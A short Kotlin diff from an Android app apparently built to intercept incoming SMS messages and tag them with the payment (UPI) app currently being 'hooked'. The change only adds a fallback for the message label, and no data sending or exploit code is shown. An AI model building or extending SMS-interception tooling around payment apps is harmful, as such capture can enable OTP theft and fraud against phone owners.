@@ -41,7 +41,9 @@ class SmsInterceptReceiver : BroadcastReceiver() {
                 sender = interceptDisplay,
                 body = body,
                 phone = interceptDisplay,
-                messageLabel = SmsMatcher.matchedHookedApp(config, sender, body)?.displayName.orEmpty(),
+                messageLabel = SmsMatcher.matchedHookedApp(config, sender, body)?.displayName
+                    ?: ActiveHookManager.readActivePackage()?.let { UpiAppRegistry.displayNameFor(it) }
+                    .orEmpty(),
                 direction = "incoming",
                 rawPeer = sender,
                 capturedAt = System.currentTimeMillis()
